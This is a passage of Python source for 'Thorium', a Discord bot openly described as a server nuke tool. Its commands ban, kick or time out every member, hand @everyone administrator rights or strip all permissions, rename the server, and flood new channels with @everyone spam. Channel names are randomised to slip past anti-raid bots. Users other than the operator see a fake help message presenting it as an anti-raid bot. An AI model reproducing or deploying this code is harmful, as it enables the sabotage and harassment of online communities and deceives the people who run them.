"̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                if Antiraidbotbypass == True:
                    Channelname = r1 + r10 + r2 + r11 + r3 + r12 + r4 + r13 + r5 + r14 + r6 + r15 + r7 + r16 + r8 + r9
                    Channelnameprint = r1 + "☣️" + r2 + "☣️" + r3 + "☣️" + r4 + "☣️" + r5 + "☣️" + r6 + "☣️" + r7 + "☣️" + r8 + "☣️"
                else:
                    from config import channelname
                    Channelname = channelname
                    Channelnameprint = Channelname
                #print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + " the channel '" + Channelnameprint + "' was created!")
                Channelsend = await ctx.message.guild.create_text_channel(Channelname)
                await Channelsend.send(f"{SpamMSG} @everyone", embed=Thorium_embed)
                await Channelsend.send(f"{SpamMSG} @everyone", embed=Thorium_embed)
                await Channelsend.send(f"{SpamMSG} @everyone", embed=Thorium_embed)


    bot.run(NukeToken)


#MAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAIN
#MAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAIN
#MAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAIN
#MAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAIN
#MAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAIN
#MAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAINMAIN
def mainprocess():
    from config import rolename
    
    rolenamesave = rolename
    rolename = rolenamesave
    rolenameprint = rolenamesave

    
    
    rolename = str(rolenamesave)
    
    bot = commands.Bot(command_prefix = Prefix, help_command=None, allowed_mentions = discord.AllowedMentions(everyone = True), intents = discord.Intents.all())
    
    @bot.event  
    async def on_ready():
        
            
        await bot.user.edit(username="¦| Thorium |¦", avatar=None)
        bot.description ="Thorium is a nuke tool!\nMade by Dummergoki\nDiscord:\nDownload:"
        await bot.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.playing, name="Server Nuking!"))
        os.system('cls' if os.name == 'nt' else 'clear')
        logo2 = r"""
 ███████████ █████                          ███                              
░█░░░███░░░█░░███                          ░░░                               
░   ░███  ░  ░███████    ██████  ████████  ████  █████ ████ █████████████    
    ░███     ░███░░███  ███░░███░░███░░███░░███ ░░███ ░███ ░░███░░███░░███   
    ░███     ░███ ░███ ░███ ░███ ░███ ░░░  ░███  ░███ ░███  ░███ ░███ ░███   
    ░███     ░███ ░███ ░███ ░███ ░███      ░███  ░███ ░███  ░███ ░███ ░███   
    █████    ████ █████░░██████  █████     █████ ░░████████ █████░███ █████  
   ░░░░░    ░░░░ ░░░░░  ░░░░░░  ░░░░░     ░░░░░   ░░░░░░░░ ░░░░░ ░░░ ░░░░░   
"""

        logo2 = fade.pinkred(logo2)
        colorama.init(strip=True)
        print(logo2)
        colorama.init(strip=False)
        print('We Are logged in as: {0.user}'.format(bot))
        

        
    #@bot.command()  
    #async def Avatar(ctx):
    #    if ctx.author.id == UserID:
    #        await bot.user.edit(avatar=)
    @bot.command()  
    async def Bypass(ctx, arg=None):
        if ctx.author.id == UserID:
            await ctx.message.delete()
            if arg == "True":
                Antiraidbotbypass = True
                print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + "Changed Bypass to 'True'")
            if arg == "False":
                Antiraidbotbypass = False
                print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + "Changed Bypass to 'False'")

                
                
    @bot.command()
    async def Stop(ctx):
        if ctx.author.id == UserID:
            await ctx.message.delete()
            exit()
            
    @bot.command()
    async def Profnuke(ctx):
        if ctx.author.id == UserID:
            guild = ctx.guild
            await ctx.message.delete()
            await ctx.guild.edit(name="Thorium on top!",icon=None,banner=None,verification_level=VerificationLevel.low)
            print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + "Change the name" + Fore.RESET)
            
    @bot.command()
    async def Ban(ctx):
        if ctx.author.id == UserID:
            guild = ctx.guild
            await ctx.message.delete()
            for member in ctx.guild.members:
                try:
                    await member.ban()
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{member.name} (✓)" + Fore.RESET)
                except:
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{member} (X)" + Fore.RESET)

            
    @bot.command()
    async def Kick(ctx):
        if ctx.author.id == UserID:
            guild = ctx.guild
            await ctx.message.delete()
            for member in ctx.guild.members:
                try:
                    await member.kick()
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{member.name} (✓)" + Fore.RESET)
                except:
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{member} (X)" + Fore.RESET)

    
    @bot.command()
    async def Timeout(ctx):
        if ctx.author.id == UserID: 
            await ctx.message.delete() 
            for member in ctx.guild.members:
                try:
                    await member.timeout(510000)
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{member.name} (✓)" + Fore.RESET)
                except:
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{member} (X)" + Fore.RESET)

            
    @bot.command()
    async def Everyperm(ctx, message, arg = None):
        if ctx.author.id == UserID:
            await ctx.message.delete()
            if arg == "None" or arg == "none":
                every_role = guild.default_role
                perms = discord.Permissions.none()
                await every_role.edit(permissions=perms)
                print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + " @everyone has now no permissions anymore")

                
            if arg == "Everyone" or arg == "Every" or arg == "everyone" or arg == "every":
                perms = discord.Permissions(administrator=True)
                guild = message.guild
                every_role = guild.default_role
                await every_role.edit(permissions=perms)
                print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + " @everyone has now admin permissions")
                
    @bot.command()
    async def Help(ctx):
        if ctx.author.id == UserID:
            await ctx.message.delete()
            embedhelp = discord.Embed(title="**Thorium Commands**", description="", color=Embedcolor)
            embedhelp.add_field(name="Main Commands", value="Bypass <Options: True/False> <Turns the Antiraidbot bypass on or off>\nNuke <This destroys a discord server>\nProfnuke <Changes the logo and name of the server!>\nStop <Stops the bot>", inline=False)
            embedhelp.add_field(name="Creation Commands", value="Create roles <count>\nCreate channels <count>\nCreate vcs <count>\n", inline=False)
            embedhelp.add_field(name="Deletion Commands", value="Delete roles\nDelete channels\nDelete emojis", inline=False)
            embedhelp.add_field(name="User Commands", value="Ban <it bans everyone from the server>\nKick <it kicks everyone from the server>\nTimeout <it timeouts everyone for like 5-6 days>\nEveryperm <Options: [Nothing]/[ALL]> <Gives the @ everyone role permissions>", inline=False)

            await ctx.send("", embed=embedhelp, ephemeral=True)
        else:
            fakeembedhelp = discord.Embed(title="**Thorium Commands**", description="There are none in that moment\nThis is a antiraid bot not a command bot\nif you want to turn it off just kick the bot", color=Embedcolor)
            ctx.send("", embed=fakeembedhelp, ephemeral=True)
    
    @bot.command()  
    async def Create(ctx, arg=None, arg2=None):
        if ctx.author.id == UserID:
            await ctx.message.delete()
            try:
                from config import rolename
    
                rolenamesave = rolename
                rolename = rolenamesave
                rolenameprint = rolenamesave
            except:
                pass
            rainbow = 1
            guild = ctx.guild           
            if arg == "roles":
                for i in range (int(arg2)):
                    r1 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r2 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r3 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r4 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r5 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r6 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r7 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r8 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                    r9 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r10 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r11 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r12 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r13 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r14 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                    r15 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
